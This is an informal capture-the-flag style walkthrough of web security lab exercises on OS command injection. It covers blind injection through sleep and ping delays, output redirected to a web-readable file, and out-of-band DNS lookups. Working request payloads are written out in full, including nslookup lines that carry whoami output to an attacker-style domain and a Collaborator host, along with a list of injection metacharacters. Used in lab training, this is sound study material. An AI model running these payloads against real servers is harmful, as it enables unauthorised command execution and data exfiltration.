command injection or shell injection is simple injecting commands to the server backend 

for example in an e-commerce website you visit the following url to view a product 

```python
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

in the backend the server gets a request looks like

```python
stockreport.pl 381 29
```

to check for the product stock 

but what if we send a command instead of just the id 
smth like 

```python
https://insecure-website.com/stockStatus?productID=echo hacked&storeID=29
```

then the server would get a request to echo that string

lets try to solve the first lab 
 

1)first try to go to the product page and capture the check stock request
2)first ill try to add my command to the request like an and gate 
smth like this 

```python
productId=1 & whoami &storeId=1
```

and it doesn't work gives an error says  unbound variable so now ill try to add the command to one of the parameters so that it doesn't have one more variable

```python
productId=1&storeId=1 | whoami
```

and that works cuz it has just two parameters and i add the command inside the storeId parameter

3)another way to solve it by using truncate #

```python
productId=1 & whoami #&storeId=1
```

that one will work too cuz i used # to truncate the rest of the request so now it doenst see the storeId parameter and it just has two variables 

some commands you will need to know along the way in case you found os injection vuln 

| Purpose of command | Linux | Windows |
| --- | --- | --- |
| Name of current user | `whoami` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |

**Blind OS command injection vulnerabilities**

 that means even tho your commands getting executed you can't really see a response or an output for it 

for example a website allows you to send a feedback to the admins but it uses a command called mail to do this 
this command usually doesn't show an output for the user so you can really test it using whoami command 

valid way to test this **OS command injection using time delays**

for example sending a request to do ping 10 times that will delay the response by 10 seconds means it really executes commands 
looks like 

```python
& ping -c 10 127.0.0.1 &
```

or 

```python
& sleep 10 &
```

so lets solve the second lab 

1) go to the feedback page and capture the request

2)test each parameter try to inject the `| sleep 10 #` to truncate the rest of the request and hit send you will find out that the email parameter is infected

request will look like 

```python
csrf=7TvQz8ThKUhJOCrYrQvaek37PWd7cucj&name=test&email=test%40test.com|sleep+10 #&subject=test&message=test
```

3)another way to solve it by the ping command 

```python
csrf=7TvQz8ThKUhJOCrYrQvaek37PWd7cucj&name=test&email=test%40test.com||+ping+-c+10+127.0.0.1+||&subject=test&message=test
```

notice while using the ping we used an or gate || not a pipe | cuz pipe wont work in that lab 

 **OS command injection by redirecting output**

even tho it's a blind os injection you can still see the output by using the vulnerability right
for example

****sometimes you need to redirect your command in a txt file then view that file later after execution to see the output 

for example 

```python
& whoami > /var/www/static/whoami.txt &
```

here you make that command whomai and then send it’s output to the file called whoami.txt then to see the output you can visit that file by visiting `https://vulnerable-website.com/whoami.txt`

lets try to solve the third lab

1)first go to the feedback page and capture the request of sending the feedback 
2)now you know that the path is called /var/www/images/ from the description 
go to the email parameter and add | whoami > //var/www/images/whoami.txt #
to  execute the command and add its output to the whoami.txt file

```python
csrf=cCmUzTC3xEpgD6737lCb51dJeBOOqib0&name=test&email=test%40test.com|+whoami+>+//var/www/images/whoami.txt+%23&subject=test&message=test
```

3)now we need to visit the file go to any page url from the website right click to the image and click open image in a new tap
url will be like [`https://0a0d004204e075c6808f8062007200e4.web-security-academy.net/image?filename=12.jpg](https://0a0d004204e075c6808f8062007200e4.web-security-academy.net/image?filename=12.jpg)` 

now modify that filename to the one you just created it will be like 
[`https://0a0d004204e075c6808f8062007200e4.web-security-academy.net/image?filename=](https://0a0d004204e075c6808f8062007200e4.web-security-academy.net/image?filename=12.jpg)whoami.txt`

 **OS command injection using out-of-band (OAST) techniques**

you can also use command injection to  trigger an out of band interaction using Out-of-band Application Security Testing (OAST) techniques 

for example

```python
& nslookup kgji2ohoyw.web-attacker.com &
```

lets solve the fourth lab :**Blind OS command injection with out-of-band interaction**

1)go to the submit feedback page and capture the request
2)go to the collaborator and copy the link
3)modify the email parameter and add ur server link to it it will look like this 
****

```python
csrf=l6reaWDcIzyU0bcIlEgUS1NmFfbO1JGA&name=test&email=test%40test.com%26+nslookup+v2y4ee7fu5qf3ptfywi5rds7oyuril6a.oastify.com+%23&subject=test&message=test
```

one more time you can do this by more than one method here i just added an and gate and then the nslookup and then truncate the rest `email=test%[40test.com](http://40test.com/)& nslookup [v2y4ee7fu5qf3ptfywi5rds7oyuril6a.oastify.com](http://v2y4ee7fu5qf3ptfywi5rds7oyuril6a.oastify.com/) #`
out in the wild you need to test for more than one method 
you can do it using an or gate like this :  `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

and maybe try the pipe, one more note dont forget to url encode it before you hit send

4)you will get the dns lookup on your collaborator server 

now we did a nslookup lets try to execute commands using that OOB method 
for example 
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &

lets solve lab number five

1)got the feedback request
first i tried 
& nslookup `whoami`.kgji2ohoyw.web-attacker.com #
didnt work 

then i tried 
| nslookup `whoami`.kgji2ohoyw.web-attacker.com #

didnt work 
but after i tried 
|| nslookup `whoami`.kgji2ohoyw.web-attacker.com ||

and it worked 
the request should look smth like this 

```python
csrf=Z5fNHpPlXe2PiWP1fbJLjODyktCA1pUy&name=test&email=test%40test.com||+nslookup+`whoami`.7s0g4qxrkhgrt1jro88hhpijeak38zwo.oastify.com||&subject=test&message=test
```

2)hit send and see the dns lookup it has the whoami output associated with the server name should look like this 

```python
peter-N0C10K.7s0g4qxrkhgrt1jro88hhpijeak38zwo.oastify.com.

```

extract the flag and submit it peter-N0C10K 

characters you can use while testing OS command injection

- `&`
- `&&`
- `|`
- `||`

for Unix-based systems:

- `;`
- Newline (`0x0a` or `\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

- ```injected command ```
- `$(`injected command `)`

**How to prevent OS command injection attacks**

-never call out to OS commands from application-layer code

- Validating against a whitelist of permitted values.
- Validating that the input is a number.
- Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
